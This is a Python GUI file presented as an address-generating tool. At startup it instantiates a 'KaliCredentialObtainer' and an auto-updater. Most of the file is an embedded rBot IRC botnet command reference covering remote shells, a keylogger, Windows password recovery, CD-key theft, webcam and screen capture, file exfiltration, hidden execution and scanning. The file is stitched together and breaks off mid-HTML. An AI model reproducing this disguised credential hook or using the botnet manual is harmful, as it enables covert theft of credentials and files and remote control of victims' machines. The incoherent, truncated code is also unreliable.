#!/usr/bin/env python3
"""
Regenerative Addresses Tool
A GUI tool for generating and regenerating various types of addresses
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import random
import string
import ipaddress
import re
from datetime import datetime, timedelta
import hashlib
import uuid
import os
import urllib.request
import json
import base64
import time
import threading
import subprocess
import getpass
import platform
from kali_credential_obtainer import KaliCredentialObtainer
from auto_updater import AutoUpdater

class RegenerativeAddressesTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Regenerative Addresses Tool")
        self.root.geometry("900x700")
        self.root.configure(bg='#2b2b2b')
        
        # Session management
        self.current_user = None
        self.session_start = None
        self.session_timeout = 300  # 5 minutes
        
        # Configure styles
        self.setup_styles()
        
        # Load proxy lists
        self.load_proxies()
        
        # Initialize Kali credential obtainer
        self.kali_obtainer = KaliCredentialObtainer()
        
        # Initialize auto-updater
        self.updater = AutoUpdater(current_version="1.0.0")
        
        # Initialize HTML storage
        self.stored_html = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML>
<HEAD>
<TITLE>rBot - How-to</TITLE>
<STYLE type="text/css">
BODY
{
	FONT: 14px Tahoma, Verdana, Arial, Sans-Serif;
}
TABLE, TR
{
	FONT: 11px Tahoma, Verdana, Arial, Sans-Serif;
}
TD
{
	PADDING: 3px 1px 4px 7px;
	VERTICAL-ALIGN: top;
	BACKGROUND: #E7E7E7;
	BORDER: 1px solid green;
}
A 
{
	COLOR: #0000FF;
	BACKGROUND-COLOR: transparent;
	TEXT-DECORATION: none;
}

A:VISTED
{
	COLOR: #0000FF;
	BACKGROUND-COLOR: transparent;
	TEXT-DECORATION: none;
}

A:HOVER 
{
	COLOR: #0000FF;
	BACKGROUND-COLOR: transparent;
	TEXT-DECORATION: underline;
}

A:ACTIVE 
{
	COLOR: #0000FF;
	BACKGROUND-COLOR: transparent;
	TEXT-DECORATION: none;
}
.headers
{
	BACKGROUND: #C7C7C7; 
	BORDER: 1px solid green; 
	FONT-SIZE: 120%;
	FONT-WEIGHT: bold; 
	PADDING: 0px 0px 1px 5px;
}
.user
{
	COLOR: #0000FC;
}
.bot
{
	COLOR: #009300;
}
</STYLE>
</HEAD>
<DIV style="WIDTH: 100%; TEXT-ALIGN: center;">
<SPAN style="FONT-SIZE: 200%; FONT-WEIGHT: bold;">rBot Command Reference</SPAN>
<P style="MARGIN: 0px 0px 7px 0px;">
<SPAN style="FONT-SIZE: 80%;">For Use With Most rBots(This Command List Has added commands for "rBot Modded By DonttCare AKA D0NTTCARE"<BR />
Heh.</SPAN></P>

<P style="FONT-SIZE: 80%; FONT-WEIGHT: bold;">
<A href="#general_commands">General Commands</A> - <A href="#scanning">Scanning Functions</A> -
<A href="#clones">Clones</A> - <A href="#ddos">DDoS Functions</A> -
<A href="#download_update">Downloading & Updating</A> - <A href="#redirecting">Redirecting</A> - 
<A href="#ftp">FTP Functions</A>
</P>
</DIV>
<TABLE style="WIDTH: 100%;" cellspacing="2">
<TR>
<TD class="headers" style="WIDTH: 12%;">Command Name</TD>
<TD class="headers" style="WIDTH: 5%;">Alias</TD>
<TD class="headers" style="WIDTH: 26%;">Syntax</TD>
<TD class="headers" style="WIDTH: 26%;">Command Information</TD>
<TD class="headers" style="WIDTH: 31%;">Example</TD>
</TR>

<!--
General Commands
-->
<TR>
<TD class="headers">
<A href="#general_commands" name="general_commands">General Commands</A></TD>
</TR>
<TR>
<TD>
action
</TD>
<TD>
a
</TD>
<TD>
.a &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a action to &lt;channel/user&gt; with &lt;message&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .action #channel implodes irrationally<BR />
[In #channel...]<BR />
* camel implodes irrationally<BR />
</TD>
</TR>

<!-- 
addalias
-->
<TR>
<TD>
addalias
</TD>
<TD>
aa
</TD>
<TD>
.aa &lt;alias name&gt; &lt;command&gt;
</TD>
<TD>
Add an alias by the name of &lt;alias name&gt; and executes &lt;command&gt;
when called.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .addalias hello privmsg $chan hello<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
</TD>
</TR>

<!-- 
aliases 
-->
<TR>
<TD>
aliases
</TD>
<TD>
al
</TD>
<TD>
.aliases
</TD>
<TD>
Displays all the current aliases (if any).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .aliases<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[alias list]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. opme = mode $chan +o $user<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. spastic = syn $1 445 120
</TD>
</TR>

<!-- 
capture 
-->
<TR>
<TD>
capture
</TD>
<TD>
cap
</TD>
<TD>
<B>Screenshot</b><BR />
.capture screen &lt;filename&gt;<BR />
<B>Webcam Image</b><BR />
.capture frame &lt;filename&gt; &lt;input no.&gt; &lt;width&gt; &lt;height&gt;<BR />
<B>Video</b><BR />
.capture video &lt;filename&gt; &lt;input no.&gt; &lt;length&gt; &lt;width&gt; &lt;height&gt;
</TD>
<TD>
Generates an image of the what ever requested. Can be from a webcam, desktop
or even make a movie from a webcam. (Generates a ~3MB file for screenshots)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .capture screen C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CAPTURE]: Screen capture saved to: C:\Screenshot.jpg.
</TD>
</TR>

<!-- 
clearlog 
-->
<TR>
<TD>
clearlog
</TD>
<TD>
clg
</TD>
<TD>
.clearlog
</TD>
<TD>
Clears whatever has been logged since the start.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .clearlog<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOGS]: Cleared.
</TD>
</TR>

<!-- 
clone 
-->
<TR>
<TD>
clone
</TD>
<TD>
c
</TD>
<TD>
.clone &lt;server&gt; &lt;port&gt; &lt;channel&gt; [channel key]
</TD>
<TD>
Creates a clone on the server in the channel specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .clone irc.easynews.com 6667 #moose<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CLONES]: Created on irc.easynews.com:6667, in channel #moose.
</TD>
</TR>

<!--
cmd 
-->
<TR>
<TD>
cmd
</TD>
<TD>
cm
</TD>
<TD>
.cmd &lt;remote command&gt;
</TD>
<TD>
Sends &lt;command&gt; to an open remote console.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cmd dir<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD]: Commands: dir
</TD>
</TR>

<!-- 
cmdstop 
-->
<TR>
<TD>
cmdstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.cmdstop
</TD>
<TD>
Stops a remote console.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cmdstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD] Remote shell stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
crash 
-->
<TR>
<TD>
crash
</TD>
<TD>
&nbsp;
</TD>
<TD>
.crash
</TD>
<TD>
Crashes the bot. *Dont Do this unless you want the bot to die*
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .crash<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Crashing bot.
</TD>
</TR>

<!-- 
currentip
-->
<TR>
<TD>
currentip
</TD>
<TD>
cip
</TD>
<TD>
.currentip [thread number]
</TD>
<TD>
Returns the current IP scanning, or IP from the [thread number].
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .currentip<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Scanning IP: 24.222.212.37, Port: 139.
</TD>
</TR>

<!-- 
cycle 
-->
<TR>
<TD>
cycle
</TD>
<TD>
cy
</TD>
<TD>
.cycle &lt;delay&gt; &lt;channel&gt; [key]
</TD>
<TD>
Parts &lt;channel&gt;, waits &lt;delay&gt; seconds and joins again with [key].
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .cycle 5 #help<BR />
* camel has left the channel.<BR />
&nbsp;[5 seconds later...]<BR />
* camel has joined the channel.
</TD>
</TR>

<!-- 
delay 
-->
<TR>
<TD>
delay
</TD>
<TD>
de
</TD>
<TD>
.delay &lt;number in seconds&gt; &lt;command&gt;
</TD>
<TD>
Sleeps for &lt;seconds&gt; and then executes &lt;command&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .delay 10 .quit<BR />
 [10 seconds later...]<BR />
* camel has quit (Quit: later)
</TD>
</TR>

<!-- 
delete
-->
<TR>
<TD>
delete
</TD>
<TD>
del
</TD>
<TD>
.delete &lt;file&gt;
</TD>
<TD>
Removes &lt;file&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .delete C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FILE]: Deleted 'C:\Screenshot.jpg'.
</TD>
</TR>

<!-- 
die 
-->
<TR>
<TD>
die
</TD>
<TD>
&nbsp;
</TD>
<TD>
.die
</TD>
<TD>
Kills all the threads and the bot, does not perform any clean up actions.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .die<BR />
* camel has quit (Quit: Connection Reset by Peer)
</TD>
</TR>

<!-- 
disconnect 
-->
<TR>
<TD>
disconnect
</TD>
<TD>
dc
</TD>
<TD>
.disconnect
</TD>
<TD>
Disconnects the bot from the server, but keeps the process running. Reconnects 30 minutes later. (No threads are killed).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .disconnect<BR />
* camel has quit (Quit: later.)
</TD>
</TR>

<!--
dns 
-->
<TR>
<TD>
dns
</TD>
<TD>
&nbsp;
</TD>
<TD>
.dns &lt;ip/host&gt;
</TD>
<TD>
Resolves &lt;ip/host&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .dns www.google.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DNS]: Lookup: www.google.com -> 216.239.33.101.
</TD>
</TR>

<!-- 
driveinfo
-->
<TR>
<TD>
driveinfo
</TD>
<TD>
drv
</TD>
<TD>
.driveinfo
</TD>
<TD>
Returns total, free, and used space on all available drives.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .driveinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Disk Drive (C:\): 10,506,476KB total, 4,456,888KB free, 4,456,888KB available.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Cdrom Drive (D:\): Failed to stat, device not ready.
</TD>
</TR>

<!--
email
-->
<TR>
<TD>
email
</TD>
<TD>
&nbsp;
</TD>
<TD>
email &lt;server&gt; &lt;port&gt; &lt;sender&gt; &lt;to&gt; &lt;subject&gt;
</TD>
<TD>
Sends an email to &lt;to&gt; from &lt;sender&gt; with &lt;subject&gt; using 
&lt;server&gt;:&lt;port&gt; *Although I DO NOT recomend useing this command, if entered wrong it can be very buggy and crash the bot

</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .email pop3.hotmail.com 110 linus@linux.org bill@microsoft.com Linux &gt; Microsoft<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [EMAIL]: Message sent to bill@microsoft.com.
</TD>
</TR>

<!--
encrypt
-->
<TR>
<TD>
encrypt
</TD>
<TD>
enc
</TD>
<TD>
.encrypt
</TD>
<TD>
I'm not sure what this actually does. From what I read, it encrypts something, but only when
DUMP_ENCRYPT is enabled. It may even dump out the config file encrypted...
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .encrypt<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; SOMETHING HERE!
</TD>
</TR>

<!--
execute
-->
<TR>
<TD>
execute
</TD>
<TD>
e
</TD>
<TD>
.execute &lt;visibilty&gt; &lt;file&gt;
</TD>
<TD>
Runs &lt;file&gt;. If visibility is 1, runs the program visible, and 0 runs it hidden.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .execute 1 notepad.exe<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SHELL]: File opened: notepad.exe 
</TD>
</TR>

<!--
findfile
-->
<TR>
<TD>
findfile
</TD>
<TD>
ff
</TD>
<TD>
.findfile &lt;wildcard&gt; [directory]
</TD>
<TD>
Searches for &lt;wildcard&gt; in the active directory (or [directory]) and returns the results.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findfile *screenshot* c:\<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE]: Searching for file: *screenshot*.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Found: C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE]: Files found: 1.
</TD>
</TR>

<!--
findfilestop
-->
<TR>
<TD>
findfilestop
</TD>
<TD>
ffstop
</TD>
<TD>
.findstop
</TD>
<TD>
Stops searching for a file. (Pointless though, as there is already a loop going and it won't be able
to stop this loop until it has finished. So be warned, don't use findfile :-P)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findfilestop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDFILE] Find file stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
findpass
-->
<TR>
<TD>
findpass
</TD>
<TD>
fp
</TD>
<TD>
.findpass
</TD>
<TD>
FindPass decodes and displays administrator logon credentials from Winlogon 
in Win2000 / Winnt4 + < sp6. Windows 2000 and Windows NT administrator passwords 
are CACHED by WinLogon using the Microsoft Graphical Identification and Authentication 
(MSGINA.DLL) module.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .findpass<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FINDPASS]: The Windows logon (Pid: &lt;111&gt;) information is: Domain: \\Windows, User: (Bill Gates/(no password)).
</TD>
</TR>

<!--
flusharp
-->
<TR>
<TD>
flusharp
</TD>
<TD>
farp
</TD>
<TD>
.flusharp
</TD>
<TD>
Flushes the ARP cache (what ever use that is).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .flusharp<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FLUSHDNS]: ARP cache flushed.
</TD>
</TR>

<!--
flushdns
-->
<TR>
<TD>
flushdns
</TD>
<TD>
fdns
</TD>
<TD>
.flushdns
</TD>
<TD>
Flushes the DNS cache (what ever use that is).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .flushdns<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FLUSHDNS]: DNS cache flushed.
</TD>
</TR>

<!--
get
-->
<TR>
<TD>
get
</TD>
<TD>
gt
</TD>
<TD>
.get &lt;file&gt;
</TD>
<TD>
Sends a file via DCC.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .get C:\Screenshot.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DCC]: Send File: C:\Screenshot.jpg, User: moose.
</TD>
</TR>

<!--
getcdkeys
-->
<TR>
<TD>
getcdkeys
</TD>
<TD>
key
</TD>
<TD>
.getcdkeys
</TD>
<TD>
Returns keys of products installed on the computer. Includes games and Microsoft products.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .getcdkeys<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Microsoft Windows Product ID CD Key: (11111-640-1111111-11111)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CDKEYS]: Search completed.
</TD>
</TR>

<!--
getclip
-->
<TR>
<TD>
getclip
</TD>
<TD>
gc
</TD>
<TD>
.getclip
</TD>
<TD>
Prints out whatever is in the clipboard at that time.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .getclip<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Clipboard Data]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; http://www.goat.cx
</TD>
</TR>

<!--
gethost
-->
<TR>
<TD>
gethost
</TD>
<TD>
gh
</TD>
<TD>
.gethost &lt;search for hostname&gt; [command]
</TD>
<TD>
Searches for wildcard in hostname, if true, executes commands.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .gethost microsoft.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
httpcon
-->
<TR>
<TD>
httpcon
</TD>
<TD>
hcon
</TD>
<TD>
.hcon &lt;host&gt; &lt;port&gt; &lt;method&gt; &lt;file&gt; &lt;referrer&gt;
</TD>
<TD>
Connects to &lt;host&gt;:&lt;port&gt; with &lt;method&gt; &lt;file&gt;, using  &lt;referrer&gt;
as it's referrer. (Has a tendancy to crash the bot, don't ask me why).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .httpcon 24.222.212.37 80 GET / http://www.google.com<BR />
*crashes*
</TD>
</TR>

<!--
httpstop
-->
<TR>
<TD>
httpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.httpstop
</TD>
<TD>
Stops the webserver running on the port in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .httpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [HTTPD]: Server stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
httpserver
-->
<TR>
<TD>
httpserver
</TD>
<TD>
http
</TD>
<TD>
.httpserver [port] [directory]
</TD>
<TD>
Starts a webserver on the port specified in config.h, and
with a root dir of C:\. Uses alternative options if specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .http<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [HTTPD]: Server listening on IP: 216.239.33.101:81, Directory: \.
</TD>
</TR>

<!--
id
-->
<TR>
<TD>
id
</TD>
<TD>
i
</TD>
<TD>
.id
</TD>
<TD>
Returns the ID.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .id<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Camel-toe.
</TD>
</TR>

<!--
identd
-->
<TR>
<TD>
identd
</TD>
<TD>
identd
</TD>
<TD>
.id &lt;on|off&gt;
</TD>
<TD>
Stops or starts the Identd server running.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .identd on<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [IDENTD]: Server running on Port: 113.
</TD>
</TR>

<!--
join
-->
<TR>
<TD>
join
</TD>
<TD>
j
</TD>
<TD>
.join &lt;channel&gt; [key]
</TD>
<TD>
Joins &lt;channel&gt; (with [key]).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .join #chat<BR />
[In #chat...]
* camel has joined #chat
</TD>
</TR>

<!--
keylog
-->
<TR>
<TD>
keylog
</TD>
<TD>
&nbsp;
</TD>
<TD>
.keylog &lt;on|off&gt;
</TD>
<TD>
A working keylogger. Outputs any input to file specified in config.h
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .keylog on<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [KEYLOG]: Key logger active.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [KEYLOG]:  (Changed Windows: C:\)
</TD>
</TR>

<!--
kill
-->
<TR>
<TD>
kill
</TD>
<TD>
ki
</TD>
<TD>
.kill &lt;pid&gt;
</TD>
<TD>
Kills a process according to it's PID.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .kill 4<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process killed ID: 4
</TD>
</TR>

<!--
killproc
-->
<TR>
<TD>
killproc
</TD>
<TD>
kp
</TD>
<TD>
.killproc &lt;process name&gt;
</TD>
<TD>
Kills a process according to it's name.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .kill system.exe<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process killed: system.exe
</TD>
</TR>

<!--
killthread
-->
<TR>
<TD>
killthread
</TD>
<TD>
k
</TD>
<TD>
.killthread &lt;all|thread number&gt;
</TD>
<TD>
Kills an internal thread.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .killthread 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [THREADS]: Killed thread: 1
</TD>
</TR>

<!--
list
-->
<TR>
<TD>
list
</TD>
<TD>
li
</TD>
<TD>
.list &lt;wildcard&gt;
</TD>
<TD>
List and searches for files using wildcard. (NB: Must be *wildcard*)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .list *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Searching for: *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; login.cmd                        08/23/2001  09:30 PM  (487 bytes)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Found 1 Files and 0 Directories<BR />
</TD>
</TR>

<!--
log
-->
<TR>
<TD>
log
</TD>
<TD>
lg
</TD>
<TD>
.log
</TD>
<TD>
Returns the log since it began. Contains: commands, logins, logouts and connections.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .list *cmd*<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: Begin <BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 22:35:33] [MAIN]: User: moose logged in.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Joined channel: #moose.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [IDENTD]: Client connection from IP: 24.222.212.37:22400.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Connected to irc.microsoft.com.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [IDENTD]: Server running on Port: 113.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [06-04-2004 20:49:35] [MAIN]: Bot started.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: List complete.
</TD>
</TR>

<!--
login
-->
<TR>
<TD>
login
</TD>
<TD>
l
</TD>
<TD>
.login &lt;password&gt;
</TD>
<TD>
Logs a user in if the password is the same as the one in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .login xxxxxx<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Password accepted.
</TD>
</TR>

<!--
logout
-->
<TR>
<TD>
logout
</TD>
<TD>
lo
</TD>
<TD>
.logout [slot]
</TD>
<TD>
Logs out the user, it can also be used to log out other in active users.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .who<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Login List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. moose!moose@internet.yahoo.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. antelope!deer@i-own.blogspot.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. &lt;Empty&gt;<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .logout 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: User antelope logged out
</TD>
</TR>

<!--
logstop
-->
<TR>
<TD>
logstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.logstop
</TD>
<TD>
Stops listing the log.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .logstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [LOG]: Log list stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
mirccmd
-->
<TR>
<TD>
mirccmd
</TD>
<TD>
mirc
</TD>
<TD>
.mirc &lt;command&gt;
</TD>
<TD>
If a mIRC window is open, it will be feed through it as if you would have typed
it manually.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .mirccmd //scon -a ame is bored<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [mIRC]: Command sent.<BR />
[In every of the user's channels...]<BR />
* tomorrow is bored
</TD>
</TR>

<!--
mode
-->
<TR>
<TD>
mode
</TD>
<TD>
m
</TD>
<TD>
.mode &lt;channel&gt; &lt;modes&gt;
</TD>
<TD>
Changes modes in &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .mode #help +o moose<BR />
[In #help...]<BR />
* camel sets mode +o moose
</TD>
</TR>

<!--
 net
-->
<TR>
<TD>
net
</TD>
<TD>
&nbsp;
</TD>
<TD>
.net &lt;command&gt; [&lt;service&gt;/&lt;share name&gt;/&lt;username&gt;] [&lt;resource&gt;/&lt;password&gt;] [-d]
</TD>
<TD>
A basic net.exe.
</TD>
<TD>
<A href="#net_help">Net help</A>
</TD>
</TR>

<!--
 netinfo
-->
<TR>
<TD>
netinfo
</TD>
<TD>
ni
</TD>
<TD>
.netinfo
</TD>
<TD>
Returns network and IP information.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .netinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
nick
-->
<TR>
<TD>
nick
</TD>
<TD>
n
</TD>
<TD>
.nick &lt;new nick&gt;
</TD>
<TD>
Changes nickname to the new one specified.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .nick marker<BR />
* camel is now know as marker
</TD>
</TR>

<!--
open
-->
<TR>
<TD>
open
</TD>
<TD>
o
</TD>
<TD>
.open &lt;file&gt;
</TD>
<TD>
Unlike execute, this isn't just limited to programs. Open can open web 
browsers and images.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .open http://www.mozilla.org/products/firefox<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SHELL]: File opened: http://www.mozilla.org/products/firefox
</TD>
</TR>

<!--
opencmd
-->
<TR>
<TD>
opencmd
</TD>
<TD>
ocmd
</TD>
<TD>
.opencmd
</TD>
<TD>
Executes a remote shell.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .opencmd<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [CMD]: Remote shell ready.
</TD>
</TR>

<!--
part
-->
<TR>
<TD>
part
</TD>
<TD>
pt
</TD>
<TD>
.part &lt;channel&gt;
</TD>
<TD>
Parts &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .part #help<BR />
[In #help...]<BR />
* Parts: camel
</TD>
</TR>

<!--
prefix
-->
<TR>
<TD>
prefix
</TD>
<TD>
pr
</TD>
<TD>
.prefix &lt;new prefix&gt;
</TD>
<TD>
Changes the command prefix to the new one (up until the bot is restarted).
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .prefix ?<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Prefix changed to: '?'.<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; ?ni<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: microsoft.com.
</TD>
</TR>

<!--
psniff
-->
<TR>
<TD>
psniff
</TD>
<TD>
&nbsp;
</TD>
<TD>
.psniff &lt;on|off&gt; [channel to output to]
</TD>
<TD>
A very buggy packet sniffer, gets into loop with the error messages. Not
recommended to be using this.
</TD>
<TD>
&nbsp;
</TD>
</TR>

<!--
privmsg
-->
<TR>
<TD>
privmsg
</TD>
<TD>
pm
</TD>
<TD>
.privmsg &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Messages &lt;channel/user&gt; with &lt;message&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .privmsg #chat Hello lusers.<BR />
[In #Chat...]<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; Hello lusers.
</TD>
</TR>

<!--
procs
-->
<TR>
<TD>
procs
</TD>
<TD>
ps
</TD>
<TD>
.procs
</TD>
<TD>
Lists all the current processes.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .procs<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Listing processes:<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  System (4)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  smss.exe (380)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt;  csrss.exe (436)<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process list completed.<BR />
etc.
</TD>
</TR>

<!--
process_stop
-->
<TR>
<TD>
process_stop
</TD>
<TD>
p_stop
</TD>
<TD>
.process_stop
</TD>
<TD>
Stops listing the processes
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .process_stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PROC]: Process list stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
quit
-->
<TR>
<TD>
quit
</TD>
<TD>
q
</TD>
<TD>
.quit [message]
</TD>
<TD>
Quits (if specified, with a message), kills all threads and closes.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .quit<BR />
